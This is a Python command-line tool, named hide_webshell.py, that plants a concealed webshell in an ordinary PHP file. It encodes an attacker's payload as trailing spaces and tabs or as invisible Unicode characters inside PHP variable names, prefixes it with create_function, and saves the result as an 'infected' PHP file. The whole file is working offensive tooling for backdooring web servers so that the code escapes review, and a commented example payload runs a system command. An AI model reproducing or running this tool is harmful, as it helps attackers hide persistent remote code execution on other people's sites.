import re
import sys
import argparse
import binascii
import platform


def put_color(string, color):
    colors = {
        'red': '31',
        'green': '32',
        'yellow': '33',

        'blue': '34',
        'pink': '35',
        'cyan': '36',
        'gray': '2',
        'white': '37',
    }

    if platform.system() == "Windows":
        return string

    return '\033[40;1;%s;40m%s\033[0m' % (colors[color], str(string))


def hide(raw_php, payload):
    infected_php = raw_php[:]
    payload = list(payload)

    if not is_pro_mode:
        for line, content in enumerate(payload):
            hex_num = hex(ord(content))
            tab_num = int(hex_num[2], 16)
            space_num = int(hex_num[3], 16)  # 最好用空格的个数代表个位数

            hidden = hidden_str[1] * tab_num + hidden_str[0] * space_num
            if line < len(infected_php):
                if infected_php[line].endswith('\n'):
                    infected_php[line] = infected_php[line][:-1] + \
                        hidden + '\n'
                else:
                    infected_php[line] = infected_php[line] + hidden
            else:
                infected_php.append(hidden + "\n")

    else:
        last_line_num = var_count = 0
        last_var = ''
        for line_num, content in enumerate(raw_php):
            php_var = re.findall('^\s*(\$[0-9a-zA-Z\_]+)\s+=', content)
            if php_var:
                last_var = php_var[0]
                last_line_num = line_num
                var_count += 1

        if not var_count:
            print('[!] ERRO: {}'.format(
                put_color('The PHP file must contains valid $vars', 'red'),
            ))
            sys.exit(1)

        replaced = {}
        for line_num, content in enumerate(raw_php[:last_line_num]):
            if not payload:
                break

            var_tmp = re.findall('^\s*(\$[0-9a-zA-Z\_]+)\s+=', content)
            if var_tmp:
                var = var_tmp[0]
                content = raw_php[line_num]
                char = payload.pop(0)
                # print('隐藏', char, content)
                hex_num = hex(ord(char))
                tab_num = int(hex_num[2], 16)
                space_num = int(hex_num[3], 16)

                # need_replace[var] = var + "\u17B4" * tab_num + "\u17B5" * space_num
                replace_str = var + hidden_str[0] * \
                    tab_num + hidden_str[1] * space_num

                replaced[var] = replace_str

            for var in replaced:
                tmp = re.findall(
                    re.escape(var)+'(?![0-9a-zA-Z_])', infected_php[line_num]
                )
                if tmp:
                    var_to_replace = tmp[0]
                    # print(f'将 {raw_php[line_num]} 中的 {var_to_replace} 替换为 {replaced[var]}')
                    infected_php[line_num] = infected_php[line_num].replace(
                        var_to_replace, replaced[var]
                    )

        if payload:
            replace_str = bin(
                int(binascii.b2a_hex(''.join(payload).encode('utf8')), 16)
            )[2:].replace('0', hidden_str[0]).replace('1', hidden_str[1])
            replaced[last_var] = last_var[:2] + replace_str + last_var[2:]

            for var in replaced:
                tmp = re.findall(
                    re.escape(var)+'(?![0-9a-zA-Z_])', infected_php[last_line_num]
                )

                if tmp:
                    var_to_replace = tmp[0]
                    # print(f'将 {raw_php[last_line_num]} 中的 {var_to_replace} 替换为 {replaced[var]}')
                    infected_php[last_line_num] = infected_php[last_line_num].replace(
                        var_to_replace, replaced[var]
                    )

    return infected_php


parser = argparse.ArgumentParser(
    description='''example: python {}{}{}'''.format(
        put_color('hide_webshell.py ', 'white'),
        put_color('normal.php ', 'blue'),
        put_color('''-pf payload.txt''', 'green'),
    )
)
parser.add_argument(
    "php",
    help="hide payload in this .php",
)
parser.add_argument(
    "-pf", "--payload_file",
    help="get hidden payload from file", required=True
)
parser.add_argument(
    "--pro", help="hide webshell in pro version",
    action='store_true', default=False
)
parser.add_argument(
    "-wf", "--webshell_file",
    help="webshell file", default='webshell_hidden.php',
)
parser.add_argument(
    "--debug", help="for debug",
    action='store_true', default=False
)

args = parser.parse_args()
php_file = args.php
payload_file = args.payload_file
webshell_file = args.webshell_file
is_pro_mode = args.pro
is_debug_mode = args.debug

mode = ['normal', 'pro'][is_pro_mode]

hidden_str = {
    'normal': [" ", "\t"],
    'pro': ["\u17b4", "\u17b5"],
}[mode]

if is_debug_mode:
    hidden_str = ["-", "+"]
    mode += '(debug)'

print('[+] Hide webshell in {} mode'.format(
    put_color(mode, 'cyan')
))

print('  [-] Get payload from {}'.format(put_color(payload_file, 'blue')))
with open(payload_file, 'r') as fp:
    exp = fp.read().strip()  # '''system("echo 'hacked by Tr0y :)'");'''

print('      Payload is {}'.format(put_color(exp, 'green')))

if not exp.endswith(';'):
    print('[!] WARN: {} {}'.format(
        put_color('The payload should end in', 'yellow'),
        put_color(';', 'cyan')
    ))

print('  [-] Get php code from {}'.format(put_color(php_file, 'blue')))

payload = 'create_function' + exp

with open(php_file, 'r') as fp:
    raw_php = fp.readlines()

infected_php = hide(raw_php, payload)

if raw_php == infected_php:
    print('[!] ERRO: {}'.format(
        put_color('hide failed', 'yellow'),
    ))
    sys.exit(1)

with open(webshell_file, 'w') as fp:
    fp.writelines(infected_php)

print('[!] Saved webshell as {}'.format(put_color(webshell_file, 'blue')))
print('[!] All done\n\nBye :)')